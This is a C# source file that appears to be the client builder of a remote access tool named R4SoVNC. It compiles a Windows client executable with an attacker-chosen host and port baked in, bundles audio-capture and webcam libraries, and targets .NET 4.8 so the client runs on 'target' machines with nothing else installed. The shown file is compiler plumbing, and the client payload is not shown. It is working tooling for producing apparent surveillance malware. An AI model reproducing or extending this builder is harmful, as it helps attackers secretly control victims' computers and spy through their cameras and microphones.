using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using Microsoft.CodeDom.Providers.DotNetCompilerPlatform;

namespace R4SoVNC.Server.Builder
{
    /// <summary>
    /// Compiles the client source files into a standalone .exe using CodeDOM.
    /// The Roslyn csc.exe compiler is bundled inside the server output (roslyn/ folder)
    /// by the Microsoft.CodeDom.Providers.DotNetCompilerPlatform NuGet package.
    /// No .NET SDK or Visual Studio required on the build machine.
    /// </summary>
    public static class ClientCompiler
    {
        private static readonly string ServerDir =
            Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)!;

        private static readonly string ClientSourceDir =
            Path.Combine(ServerDir, "ClientSource");

        public class CompileResult
        {
            public bool   Success      { get; init; }
            public string ExePath      { get; init; } = "";
            public string ErrorMessage { get; init; } = "";
        }

        public static CompileResult Compile(
            string host, int port,
            string outputDir,
            Action<string> progress,
            CancellationToken cancel = default)
        {
            string? tempConfig = null;
            try
            {
                // ── 1. Validate ClientSource ──────────────────────────────────
                if (!Directory.Exists(ClientSourceDir))
                    return Fail($"ClientSource folder not found:\n{ClientSourceDir}");

                cancel.ThrowIfCancellationRequested();
                progress("Collecting source files...");

                var sourceFiles = Directory.GetFiles(
                    ClientSourceDir, "*.cs", SearchOption.AllDirectories).ToList();

                if (sourceFiles.Count == 0)
                    return Fail("No .cs files found in ClientSource.");

                // ── 2. Patch ClientConfig.cs with baked-in HOST & PORT ────────
                progress("Injecting host and port...");

                string configContent =
                    "namespace R4SoVNC.ClientEmbed\n{\n" +
                    "    internal static class ClientConfig\n    {\n" +
                    $"        public const string HOST = \"{Escape(host)}\";\n" +
                    $"        public const int    PORT = {port};\n" +
                    "    }\n}\n";

                // Write patched config to a temp file and swap it in
                tempConfig = Path.GetTempFileName() + ".cs";
                File.WriteAllText(tempConfig, configContent, Encoding.UTF8);

                // Replace the original ClientConfig.cs path with the patched temp
                int idx = sourceFiles.FindIndex(
                    f => Path.GetFileName(f).Equals("ClientConfig.cs", StringComparison.OrdinalIgnoreCase));
                if (idx >= 0) sourceFiles[idx] = tempConfig;
                else          sourceFiles.Add(tempConfig);

                // ── 3. Set up compiler parameters ─────────────────────────────
                progress("Configuring CodeDOM compiler...");
                cancel.ThrowIfCancellationRequested();

                Directory.CreateDirectory(outputDir);
                string exePath = Path.Combine(outputDir, "R4SoVNC.Client.exe");

                var compilerParams = new CompilerParameters
                {
                    GenerateExecutable      = true,
                    OutputAssembly          = exePath,
                    IncludeDebugInformation = false,
                    TreatWarningsAsErrors   = false,
                    // Target .NET Framework 4.8 exe — pre-installed on all Win10/11
                    // so the built client runs without any additional runtime on target machine
                    CompilerOptions =
                        "/optimize " +
                        "/platform:x64 " +
                        "/langversion:latest " +
                        "/nullable:enable " +
                        "/nowarn:8600,8603,8604,8618,8625"
                };

                // Standard .NET Framework assemblies (resolved from GAC automatically)
                compilerParams.ReferencedAssemblies.AddRange(new[]
                {
                    "mscorlib.dll",
                    "System.dll",
                    "System.Core.dll",
                    "System.Drawing.dll",
                    "System.Windows.Forms.dll",
                    "System.Net.dll",
                    "System.Data.dll",
                    "Microsoft.CSharp.dll",
                });

                // NuGet dependency DLLs from the server's own output directory
                AddDep(compilerParams, "NAudio.dll");
                AddDep(compilerParams, "NAudio.Core.dll");
                AddDep(compilerParams, "NAudio.WinMM.dll");
                AddDep(compilerParams, "NAudio.Wasapi.dll");
                AddDep(compilerParams, "NAudio.Asio.dll");
                AddDep(compilerParams, "AForge.dll");
                AddDep(compilerParams, "AForge.Math.dll");
                AddDep(compilerParams, "AForge.Video.dll");
                AddDep(compilerParams, "AForge.Video.DirectShow.dll");
                AddDep(compilerParams, "Newtonsoft.Json.dll");

                // ── 4. Copy dependency DLLs to output ─────────────────────────
                progress("Copying dependencies to output folder...");
                CopyDeps(outputDir);

                // ── 5. Compile via CodeDOM (uses bundled roslyn/csc.exe) ───────
                progress($"Compiling {sourceFiles.Count} source files with CodeDOM...");
                cancel.ThrowIfCancellationRequested();

                CompilerResults results;
                using (var provider = new CSharpCodeProvider())
                {
                    results = provider.CompileAssemblyFromFile(
                        compilerParams,
                        sourceFiles.ToArray());
                }

                // ── 6. Check for errors ───────────────────────────────────────
                var errors = results.Errors
                    .Cast<CompilerError>()
                    .Where(e => !e.IsWarning)
                    .ToList();

                if (errors.Count > 0)
                {
                    var msg = string.Join("\n",
                        errors.Select(e =>
                            $"[{e.ErrorNumber}] {Path.GetFileName(e.FileName)} ({e.Line}): {e.ErrorText}"));
                    return Fail($"Compilation errors ({errors.Count}):\n\n{msg}");
                }

                progress("Done!");
                return new CompileResult { Success = true, ExePath = exePath };
            }
            catch (OperationCanceledException)
            {
                return Fail("Build cancelled.");
            }
            catch (Exception ex)
            {
                return Fail(ex.ToString());
            }
            finally
            {
                // Clean up temp ClientConfig.cs
                if (tempConfig != null)
                    try { File.Delete(tempConfig); } catch { }
            }
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private static void AddDep(CompilerParameters p, string dll)
        {
            string full = Path.Combine(ServerDir, dll);
            if (File.Exists(full))
                p.ReferencedAssemblies.Add(full);
        }

        private static void CopyDeps(string outputDir)
        {
            string[] deps = {
                "NAudio.dll", "NAudio.Core.dll", "NAudio.WinMM.dll",
                "NAudio.Wasapi.dll", "NAudio.Asio.dll",
                "AForge.dll", "AForge.Math.dll",
                "AForge.Video.dll", "AForge.Video.DirectShow.dll",
                "Newtonsoft.Json.dll",
            };
            foreach (string dep in deps)
            {
                string src = Path.Combine(ServerDir, dep);
                string dst = Path.Combine(outputDir, dep);
                if (File.Exists(src) && !File.Exists(dst))
                    File.Copy(src, dst);
            }
        }

        private static CompileResult Fail(string msg) =>
            new CompileResult { Success = false, ErrorMessage = msg };

        private static string Escape(string s) =>
            s.Replace("\\", "\\\\").Replace("\"", "\\\"");
    }
}
